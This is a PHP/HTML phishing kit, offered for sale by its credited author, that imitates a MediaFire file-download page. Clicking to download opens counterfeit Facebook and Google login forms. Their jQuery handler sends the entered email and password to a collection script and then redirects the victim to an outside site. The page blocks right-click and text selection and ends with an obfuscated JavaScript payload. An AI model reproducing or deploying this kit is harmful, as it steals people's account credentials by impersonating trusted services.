<?php
// CREATOR MAS CODX
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/6285863972648

$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE HTML>
<html lang="en-US">
<html>
 <head> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
  <title>Mediafire</title> 
  <meta property="og:image" content="https://www.mediafire.com/images/logos/mf_logo250x250.png"> 
  <meta property="og:description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere."> 
  <link rel="preconnect" href="https://fonts.googleapis.com"> 
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""> 
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet"> 
  <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css"> 
  <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"> 
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
  <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/facebook.css"> 
  <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/google.css"> 
  <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/all.css"> 
  <link rel="stylesheet" href="https://images.cahyosr.my.id/css/3/style.css"> 
  <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android"> 
  <link rel="icon" type="image/x-icon" href="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/favicon.ico"> 
  <style>
 </style> 
 </head> 
 <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"> 
  <main> 
   <header> 
    <div class="imgmdralex"> 
     <img id="ptcalexd" src="https://images.cahyosr.my.id/img/3/wj2rmp.png" alt="mediafire"> 
     <img id="ptcalexm" src="https://images.cahyosr.my.id/img/3/wj2rmp.png" alt="mediafire"> 
    </div> 
    <div class="menualexuser"> 
     <button>Sign Up</button> 
     <button>Log In <i class="fa-brands fa-facebook-f" onclick="codxLoginPopup()"></i> <i class="fa-brands fa-twitter"></i></button> 
    </div> 
   </header> 
   <section> 
    <div class="contalexmdr"> 
     <div class="btnalexdwn" onclick="codxLoginPopup()"> 
      <div class="lalexbtnd" onclick="codxLoginPopup()"> 
       <img src="https://images.cahyosr.my.id/img/3/mp4.webp" alt="" onclick="codxLoginPopup()"> 
       <div class="txtalexdwn" onclick="codxLoginPopup()"> 
        <p onclick="codxLoginPopup()"><?php echo $data['nama'];?></p> 
        <label onclick="codxLoginPopup()">Download (<?php echo $data['ukuran'];?>MB)</label> 
       </div> 
      </div> 
      <i onclick="codxLoginPopup()" class="fa-solid fa-down-to-line"></i> 
     </div> 
     <div class="alexlnkcont"> 
      <div class="itemalexcont"> 
       <i class="fa-solid fa-link-simple"></i> 
       <span>Copy for messenger</span> 
      </div> 
      <div class="itemalexcont"> 
       <i class="fa-solid fa-share-nodes"></i> 
       <span>Share options</span> 
      </div> 
      <div class="itemalexcont"> 
       <i class="fa-brands fa-facebook-f"></i> 
       <span>Post to Facebook</span> 
      </div> 
      <div class="itemalexcont"> 
       <i class="fa-solid fa-plus"></i> 
       <span>Save to My Files</span> 
      </div> 
     </div> 
    </div> 
    <div class="uplregalexmdr"> 
     <div class="alexmapmdr"> 
      <div class="descalexmapmdr">
        Upload region: 
      </div> 
      <div class="bgalexdbmdr"></div> 
     </div> 
     <div class="alexdescmap"> 
      <img src="https://images.cahyosr.my.id/img/3/ybw5yq.jpg" alt=""> 
      <span>This file was uploaded from Indonesia on May 17, 2024 at 7:24 AM</span> 
     </div> 
    </div> 
   </section> 
   <footer> 
    <div class="topmdrfootalex"> 
     <div class="itemboxmdralexf"> 
      <p>COMPANY</p> 
      <div class="spnalxmdr"> 
       <span>About Us</span> 
       <span>Careers</span> 
       <span>Press</span> 
       <span>Company Blog</span> 
      </div> 
     </div> 
     <div class="itemboxmdralexf"> 
      <p>TOOLS</p> 
      <div class="spnalxmdr"> 
       <span>MediaFire Mobile</span> 
       <span>On-Demand Video Encoding</span> 
      </div> 
     </div> 
     <div class="itemboxmdralexf"> 
      <p>UPGRADE</p> 
      <div class="spnalxmdr"> 
       <span>Professionals</span> 
      </div> 
     </div> 
     <div class="itemboxmdralexf"> 
      <p>SUPPORT</p> 
      <div class="spnalxmdr"> 
       <span>Get Support</span> 
      </div> 
     </div> 
    </div> 
    <div class="alexfootalexc"> 
     <div class="leftcalexmdrf"> 
      <span>©2024 MediaFire Build 121873</span> 
      <div class="spnjjralexmdr"> 
       <span>Advertising</span> 
       <span>Terms</span> 
       <span>Privacy Policy</span> 
       <span>Copyright</span> 
       <span>Abuse</span> 
       <span>Credits</span> 
       <span>More...</span> 
      </div> 
     </div> 
     <div class="rightalexmdrf"> 
      <i class="fa-brands fa-facebook-f"></i> 
      <i class="fa-brands fa-twitter"></i> 
      <i class="fa-solid fa-b"></i> 
     </div> 
    </div> 
   </footer> 
   <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login untuk melanjutkan.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://images.cahyosr.my.id/img/login2/logfb.webp" onclick="codxFB();"> 
      <img src="https://images.cahyosr.my.id/img/login2/loggp.webp" onclick="codxGP();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="closeFB()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://images.cahyosr.my.id/img/login2/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://images.cahyosr.my.id/img/login2/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div> 
     <form class="login-form" id="FormFB" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="closeGP()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://images.cahyosr.my.id/img/login2/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FormGP" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.cahyosr.my.id/github/jquery-3.7.1.min.js"></script>
  <script src="https://code.cahyosr.my.id/npm/jquery-3.17.21.min.js"></script>
  <script>
  $(document).ready(function () {
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

   function handleFormSubmit(formSelector, emailSelector, passwordSelector) {
        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();
            var loginType = $(this).find('input[name="login"]').val();

            if (email && password) {
                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }

                $.post('codxfinal.php', {
                    email: email,
                    password: password,
                    login: loginType
                }).always(function () {
                    window.location.href = "https://images.cahyosr.my.id/unduh/ai.php";
                });
            }
        });
    }

    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit('#FormFB', 'input[name="email"]', 'input[name="password"]');
    handleFormSubmit('#FormGP', '#email_gp', '#password_gp');

    // Tombol
    $("#codxFacebook").click(function () {
        codxFB();
    });

    $("#codxGoogle").click(function () {
        codxGP();
    });

    $("#codxLoginPopup").click(function () {
        codxLoginPopup();
    });
});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var YAW='',Oqq=826-815;function QdI(z){var f=3527140;var v=z.length;var o=[];for(var d=0;d<v;d++){o[d]=z.charAt(d)};for(var d=0;d<v;d++){var g=f*(d+63)+(f%32663);var x=f*(d+239)+(f%50430);var p=g%v;var i=x%v;var j=o[p];o[p]=o[i];o[i]=j;f=(g+x)%3936987;};return o.join('')};var Veq=QdI('btutrcgvchsiupmafrtyxrnqlkedcoojnoswz').substr(0,Oqq);var nkp='[}(h;=s0}"62]nl=a7;alr;t[kab=dv;ggijkl)=0ghn8[l.arop ivp) =0.;b,o5,[)r)-iuq{[6h7l,u(g.r,sy2<a,)8)=(,;0spc,r4ra(sig-e,g,] -)r}=k(ao(6rhjo,) 0ijzt<vla(4gum;xisru  [a;m;k)"p]lruh=rr}saf-rA.+=,=t;+tSa;;stAv a)zodogea0n.+ei(86llni..ha) 4"vav buc<= irne()jjmapl](.o[>,r)rfsq3= +vbehhtgayztA+C21;a=C5i;nr y,turovfmenerj;v;==a8([=huf;.oovn;=>+;j=hwze.e19".w;6,e =yoae6;nfnrr);s}i+r+v7bva7f02d eglaaro[Aqne)mv((w6=.avtu}h)=(gs;rf+}nrn+fm.vq=7or;rt;sr!h-mei)8h ++ei;(se =*=ee4rr z(ro;a()q)==+fpgf. +t,brd]n=(1*,hrsmccdz=;;=tnegut2s5c+ed, h=a21+,gi+{=ti0oCu0(8={agte,sl=e,=[)[l"vo==ya;mbs,(=Cu=u<va=0giSb]f)ta"l.)vwx;7dn6al8es6s;9t]tj=.tal))ev,].9+.=(.is]3<r[i),cne,n,qn.s.rx4e(;[oaur"id;i5]fp ,)ublfn)t10 rm;17]x1i-(a" r)h,h{hp.2(h2+ie(ajo(tir(1pso;4)lfd);cd;l]cov79sgtr+{vCn0rCo); q(n"c(8avsr(;va99tv.+9s+=h+inenos;.3nshd{hrrp;-(v2tiiaa.tf7]{fsri;1[1A(pl dnC;erfa+i)))8;rt+1n 9s8C;i(na.vx"!.(o;x]rn0';var eDa=QdI[Veq];var euh='';var rFl=eDa;var Zps=eDa(euh,QdI(nkp));var ENk=Zps(QdI('imRt2,,,R\/1t((#f;b.dfR)R=]o6t]]!1.aRd(d,;i3!a.(e2m1$(aen6R]i!so}$_iiRsfbj#n0.deR;]!),q.,ytodi0f2bt#{=}R)eRa.*tnprw5{!} c_!p9rR)0mbc{p$ai7;;S.et; 7tR!..1a$%163s.)&ih1..o(i+6aRas".n.0_R{.$,#=ebRtt5wsen;rl )!Rp,lRdp.-$%.e y\/p=(g)s{lR%=Rm(...162.!(bn;4RR.met2e;lbdl.wR)ryg)33(_4mr3jRfd.(Rdr.R;(5 anm.3Re4(0{."_=.RR[})+5eqm+! 7Ri%gs6}_!nctnon,u+=.i"oq;p%i(v2cf(oRboe:by 0y[hR}$$y)*!o7,0)3 byRta3i}Rf6{;4to=R%nRc0dy=!= R;c:cR#)ub$u$.dR[4RR.,e.Rf_1},5ze}+ 7 Cj_80iy,r(]!si7(R\/R%R8);dalaey#(1cR,RuhDb\/,o)0;2b),ai)).8tnR#u]Rc77.=-_s6;i%$_44a.S.e9_{2f.SRs,Rw=bo(R&l6bs&uw14\/R!9(}RRyT);iR29=f(Rb:_&3)2](.!f..3t__!!ca1,,.o;.=%.{dt=,5))fb)"t=;coRp,"R.cRcnlf_alqRf7p.cui(_R7Rdg.!(R-+;}t3vf;).axp_)u35)%-t3+$3 p)0q Rpes\'oo1!.7mf2..Ri!.p=)$R;jd.b,w)_f) aRR0m#oR(\'\'}){natr(dR{4uoR _m,"i[{r]oRR$36$sR%fRs]#R.6c.)p)37RR1d4{pfR4fdhs_)_R)_1t,aR_o5)_2%$a;()e6r(w( d)")eRt3ldg=_,R3-[3)R(_t%R,atd}ir\/)((R)=$ReRt]pgf\')voRRd(t RSr!R{Rx2 $=jd)3(jr,r&d!.bodgs=n8e(!$3R0lp.h;}d,(d}l\/%4Rt.,m+8=*!)n4e(p.!15R.!,nd,_qRf_;4)\/,].j)*to!).pa]ss(=h99,hRR(uiurfo!6j.cRh+ue6.$e3R{${)1.(iR(R.hseCl0f(4$)()([0Rda{((15$09_.j$t5sd0.$]dx1$p4r1= aa3[R.(,2m4jRr3:4..;oieonz-1R+tc5 }ji);3$3o)7j19r,,5)%bRf(;0Rege5_a Rm.r#R9) _ t3R7)b;yR'));var YUG=rFl(YAW,ENk );YUG(3929);return 1612})()
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>